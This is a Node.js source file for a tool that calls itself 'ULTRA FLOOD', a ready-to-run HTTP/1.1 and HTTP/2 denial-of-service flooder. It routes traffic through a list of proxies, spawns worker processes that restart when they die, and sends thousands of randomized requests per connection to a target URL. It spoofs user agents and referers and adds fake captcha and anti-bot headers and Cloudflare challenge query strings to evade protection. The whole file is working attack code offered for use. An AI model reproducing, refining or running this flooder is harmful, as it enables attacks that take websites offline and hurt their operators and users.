const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');

// ERROR HANDLING
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], 
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => process.exit(0))
    .on("SIGINT", () => process.exit(0))
    .on("SIGTERM", () => process.exit(0));

// CONFIGURATION
const statusesQ = [];
let statuses = {};
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

// COMMAND LINE ARGUMENTS - UPDATED FOR BROWSER.JS COMPATIBILITY
const reqmethod = process.argv[2] || 'GET';
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];

// ARGUMENT PARSING
function getArgValue(argName, defaultValue = undefined) {
    const index = process.argv.indexOf(argName);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : defaultValue;
}

const method = getArgValue('--method', 'mix');
const forceHttp = getArgValue('--http', 'balanced');
const postdata = getArgValue('--postdata');
const query = getArgValue('--randpath');
const refererValue = getArgValue('--referer');
const cookieValue = getArgValue('--cookie');
const useCaptcha = process.argv.includes('--chaptcha');

if (!target || !time || !threads || !ratelimit || !proxyfile) {
    console.log(`🚀 ULTRA FLOOD - HTTP/1.1 & HTTP/2 Hybrid`);
    console.log(`Usage: node ${process.argv[1]} <METHOD> <URL> <TIME> <THREADS> <RATE> <PROXY_FILE> [--cookie <cookie>] [--referer <referer>] [--chaptcha]`);
    console.log(`Example: node flood.js GET https://example.com 60 100 5000 proxies.txt --cookie "session=abc" --referer rand --chaptcha`);
    process.exit(1);
}

const url = new URL(target);
const proxyRaw = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(p => p && p.includes(':'));
const proxy = [...proxyRaw, ...proxyRaw, ...proxyRaw];

// ENHANCED REFERERS AND USER AGENTS
const enhancedReferers = [
    "https://www.google.com/", "https://www.facebook.com/", "https://www.youtube.com/", 
    "https://www.amazon.com/", "https://www.reddit.com/", "https://twitter.com/",
    "https://www.instagram.com/", "https://www.linkedin.com/", "https://www.github.com/", 
    "https://www.stackoverflow.com/", "https://www.microsoft.com/", "https://www.apple.com/",
    "https://www.netflix.com/", "https://www.tiktok.com/", "https://discord.com/",
    "https://www.bing.com/", "https://www.yahoo.com/", "https://www.baidu.com/"
];

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
];

// UTILITIES
function randstr(l) {
    const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let r = "";
    for (let i = 0; i < l; i++) r += c[Math.floor(Math.random() * c.length)];
    return r;
}

// PROTOCOL SELECTION - 70% HTTP/2, 30% HTTP/1.1
function getProtocolConfig() {
    if (forceHttp === 'h1') {
        return { ALPNProtocols: ['http/1.1'], forceHttp: 1 };
    } else if (forceHttp === 'h2') {
        return { ALPNProtocols: ['h2'], forceHttp: 2 };
    } else {
        return Math.random() < 0.7 ? 
            { ALPNProtocols: ['h2', 'http/1.1'], forceHttp: 2 } : 
            { ALPNProtocols: ['http/1.1'], forceHttp: 1 };
    }
}

// METHOD SELECTION
function getAttackMethod() {
    if (method === 'mix') {
        const methods = ['GET', 'HEAD', 'POST', 'PUT', 'OPTIONS'];
        return methods[Math.floor(Math.random() * methods.length)];
    }
    return method || reqmethod;
}

// TLS CONFIG
function getTLSConfig(protocolConfig) {
    const config = {
        servername: url.hostname,
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384', 
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES256-GCM-SHA384'
        ].join(':'),
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
        secure: true,
        minVersion: 'TLSv1.2',
        rejectUnauthorized: false
    };

    if (protocolConfig.forceHttp === 2) {
        config.ALPNProtocols = ['h2', 'http/1.1'];
    } else {
        config.ALPNProtocols = ['http/1.1'];
    }

    return config;
}

// FLOOD INTENSITY
function getFloodIntensity(protocol) {
    const baseRatelimit = parseInt(ratelimit);
    
    if (protocol === 2) {
        return {
            requestsPerCycle: 1000 + Math.floor(Math.random() * 500),
            delay: 0,
            streamIncrement: 20,
            connectionRetryDelay: 2,
            maxRequests: 20000
        };
    } else {
        return {
            requestsPerCycle: 400 + Math.floor(Math.random() * 200),
            delay: 1,
            streamIncrement: 1,
            connectionRetryDelay: 5,
            maxRequests: 10000
        };
    }
}

// HEADER GENERATION
function generateHeaders(currentMethod) {
    const currentReferer = refererValue === 'rand' ? 
        enhancedReferers[Math.floor(Math.random() * enhancedReferers.length)] : 
        (refererValue || enhancedReferers[Math.floor(Math.random() * enhancedReferers.length)]);

    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    
    let headers = `${currentMethod} ${url.pathname}${handleQuery(query)} HTTP/1.1\r\n`;
    headers += `Host: ${url.hostname}\r\n`;
    headers += `User-Agent: ${userAgent}\r\n`;
    headers += `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n`;
    headers += `Accept-Encoding: gzip, deflate, br\r\n`;
    headers += `Accept-Language: en-US,en;q=0.9\r\n`;
    headers += `Cache-Control: no-cache\r\n`;
    headers += `Connection: Keep-Alive\r\n`;
    headers += `Referer: ${currentReferer}\r\n`;

    if (cookieValue) {
        headers += `Cookie: ${cookieValue}\r\n`;
    }

    if (Math.random() < 0.4) {
        headers += `Origin: ${url.origin}\r\n`;
    }

    // Add captcha-related headers if enabled
    if (useCaptcha) {
        headers += `X-Captcha-Token: ${randstr(32)}\r\n`;
        headers += `X-Anti-Bot: ${randstr(16)}\r\n`;
    }

    if (currentMethod === 'POST' || currentMethod === 'PUT') {
        const body = postdata || `data=${randstr(25)}&timestamp=${Date.now()}`;
        headers += `Content-Type: application/x-www-form-urlencoded\r\n`;
        headers += `Content-Length: ${body.length}\r\n\r\n`;
        headers += body;
    } else {
        headers += '\r\n';
    }

    return Buffer.from(headers);
}

// Pre-generate payloads for HTTP/1.1
const h1payloads = [];
for (let i = 0; i < 100; i++) {
    h1payloads.push(generateHeaders(getAttackMethod()));
}

// HTTP/2 FRAME FUNCTIONS
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    return payload.length > 0 ? Buffer.concat([frame, payload]) : frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    let payload = data.subarray(9, 9 + length);
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function handleQuery(queryType) {
    if (!queryType) return '';
    if (queryType === '1') return `?__cf_chl_rt_tk=${randstr(30)}`;
    if (queryType === '2') return `?${randstr(8)}=${randstr(10)}`;
    if (queryType === '3') return `?q=${randstr(6)}&search=${randstr(8)}`;
    return `?${randstr(6)}=${randstr(10)}&cache=${Date.now()}`;
}

// MAIN CONNECTION FUNCTION
function go() {
    if (proxy.length === 0) return setTimeout(go, 1000);

    const proxyEntry = proxy[~~(Math.random() * proxy.length)].split(':');
    const [proxyHost, proxyPort] = proxyEntry;

    if (!proxyPort || isNaN(proxyPort)) return setTimeout(go, 500);

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const protocolConfig = getProtocolConfig();
            const tlsOptions = getTLSConfig(protocolConfig);
            
            const tlsSocket = tls.connect({
                socket: netSocket,
                ...tlsOptions
            }, () => {
                const actualProtocol = tlsSocket.alpnProtocol || 'http/1.1';
                const floodConfig = getFloodIntensity(protocolConfig.forceHttp);

                if (actualProtocol === 'http/1.1') {
                    let requestCount = 0;

                    function sendHTTP1Request() {
                        if (tlsSocket.destroyed || requestCount >= floodConfig.maxRequests) {
                            tlsSocket.destroy();
                            setTimeout(go, floodConfig.connectionRetryDelay);
                            return;
                        }

                        const payload = h1payloads[Math.floor(Math.random() * h1payloads.length)];
                        tlsSocket.write(payload, (err) => {
                            if (!err) {
                                requestCount++;
                                statuses['total'] = (statuses['total'] || 0) + 1;
                                statuses['http1'] = (statuses['http1'] || 0) + 1;
                                setTimeout(sendHTTP1Request, floodConfig.delay);
                            } else {
                                tlsSocket.destroy();
                                setTimeout(go, floodConfig.connectionRetryDelay);
                            }
                        });
                    }

                    const concurrent = Math.min(20, floodConfig.requestsPerCycle);
                    for (let i = 0; i < concurrent; i++) {
                        setTimeout(sendHTTP1Request, i * 1);
                    }

                } else {
                    let streamId = 1;
                    let hpack = new HPACK();
                    hpack.setTableSize(4096);

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            [1, 65535],
                            [2, 0],
                            [3, 1000],
                            [4, 6291456],
                            [5, 32768],
                            [6, 262144]
                        ]))
                    ];

                    tlsSocket.write(Buffer.concat(frames));

                    let settingsAckReceived = false;
                    
                    tlsSocket.on('data', (data) => {
                        try {
                            const frame = decodeFrame(data);
                            if (frame) {
                                if (frame.type === 4) {
                                    if (!settingsAckReceived) {
                                        tlsSocket.write(encodeFrame(0, 4, "", 1));
                                        settingsAckReceived = true;
                                    }
                                }
                            }
                        } catch (e) {}
                    });

                    function sendHTTP2Batch() {
                        if (tlsSocket.destroyed || !settingsAckReceived) {
                            setTimeout(go, floodConfig.connectionRetryDelay);
                            return;
                        }
                        
                        const requests = [];
                        const batchSize = floodConfig.requestsPerCycle;

                        for (let i = 0; i < batchSize; i++) {
                            const currentMethod = getAttackMethod();
                            const currentReferer = enhancedReferers[Math.floor(Math.random() * enhancedReferers.length)];
                            
                            const headers = [
                                [":method", currentMethod],
                                [":authority", url.hostname],
                                [":scheme", "https"],
                                [":path", url.pathname + handleQuery(query)],
                                ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],
                                ["accept-encoding", "gzip, deflate, br"],
                                ["accept-language", "en-US,en;q=0.9"],
                                ["cache-control", "no-cache"],
                                ["referer", currentReferer],
                                ["user-agent", userAgents[Math.floor(Math.random() * userAgents.length)]]
                            ];

                            if (cookieValue) {
                                headers.push(["cookie", cookieValue]);
                            }

                            if (useCaptcha) {
                                headers.push(["x-captcha-token", randstr(32)]);
                                headers.push(["x-anti-bot", randstr(16)]);
                            }

                            if (currentMethod === 'POST') {
                                headers.push(["content-type", "application/x-www-form-urlencoded"]);
                            }

                            const headerBlock = hpack.encode(headers);
                            const frameHeader = Buffer.from([
                                0x00, 0x00, headerBlock.length, 0x01, 0x04
                            ]);
                            
                            requests.push(encodeFrame(streamId, 1, Buffer.concat([frameHeader, headerBlock]), 0x05));
                            streamId += floodConfig.streamIncrement;
                            statuses['total'] = (statuses['total'] || 0) + 1;
                            statuses['http2'] = (statuses['http2'] || 0) + 1;
                        }

                        tlsSocket.write(Buffer.concat(requests), (err) => {
                            if (!err) {
                                setTimeout(sendHTTP2Batch, floodConfig.delay);
                            } else {
                                tlsSocket.destroy();
                                setTimeout(go, floodConfig.connectionRetryDelay);
                            }
                        });
                    }
                    
                    setTimeout(() => {
                        if (settingsAckReceived) {
                            const batches = Math.min(10, Math.floor(floodConfig.requestsPerCycle / 100));
                            for (let i = 0; i < batches; i++) {
                                setTimeout(sendHTTP2Batch, i * 5);
                            }
                        }
                    }, 50);
                }
            });

            tlsSocket.on('error', () => {
                tlsSocket.destroy();
                setTimeout(go, 1000);
            });

            tlsSocket.on('close', () => {
                setTimeout(go, 1000);
            });
        });

        netSocket.write(`CONNECT ${url.hostname}:443 HTTP/1.1\r\nHost: ${url.hostname}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', () => {
        netSocket.destroy();
        setTimeout(go, 1000);
    });
}

// CLUSTER IMPLEMENTATION
if (cluster.isMaster) {
    console.log(`🚀 ULTRA FLOOD - HTTP/1.1 & HTTP/2 Hybrid`);
    console.log(`🎯 Target: ${target}`);
    console.log(`⏰ Time: ${time}s | Threads: ${threads} | Rate: ${ratelimit}`);
    console.log(`🔧 Method: ${method} | Protocol: ${forceHttp}`);
    console.log(`🍪 Cookie: ${cookieValue ? 'Yes' : 'No'} | Captcha: ${useCaptcha ? 'Yes' : 'No'}`);
    console.log(`📊 Starting attack...\n`);

    let totalRequests = 0;
    let lastTotal = 0;
    let lastTime = Date.now();
    let workers = {};

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    cluster.on('message', (worker, message) => {
        workers[worker.id] = message;
    });

    setInterval(() => {
        let currentTotal = 0;
        let http1Count = 0;
        let http2Count = 0;
        
        for (let w in workers) {
            if (workers[w]) {
                for (let st of workers[w]) {
                    currentTotal += st['total'] || 0;
                    http1Count += st['http1'] || 0;
                    http2Count += st['http2'] || 0;
                }
            }
        }
        
        const now = Date.now();
        const timeDiff = (now - lastTime) / 1000;
        const reqsPerSec = timeDiff > 0 ? Math.round((currentTotal - lastTotal) / timeDiff) : 0;

        process.stdout.write(`\r📊 RPS: ${reqsPerSec} | Total: ${currentTotal} | H1: ${http1Count} | H2: ${http2Count} | Time: ${Math.round((now - lastTime) / 1000)}s`);
        
        lastTotal = currentTotal;
        lastTime = now;
        
    }, 2000);

    cluster.on('exit', (worker) => {
        cluster.fork();
    });

    setTimeout(() => {
        console.log('\n\n✅ Attack completed!');
        process.exit(0);
    }, time * 1000);

} else {
    let connectionCount = 0;
    const maxConnections = 800;
    
    const connectionInterval = setInterval(() => {
        if (connectionCount < maxConnections) {
            const burst = 8 + Math.floor(Math.random() * 15);
            for (let i = 0; i < burst; i++) {
                if (connectionCount < maxConnections) {
                    connectionCount++;
                    go();
                }
            }
        }
    }, 3);

    setInterval(() => {
        if (statusesQ.length >= 5) statusesQ.shift();
        statusesQ.push({...statuses});
        statuses = {};
        process.send(statusesQ);
    }, 1000);

    setTimeout(() => {
        clearInterval(connectionInterval);
        process.exit(0);
    }, time * 1000);
}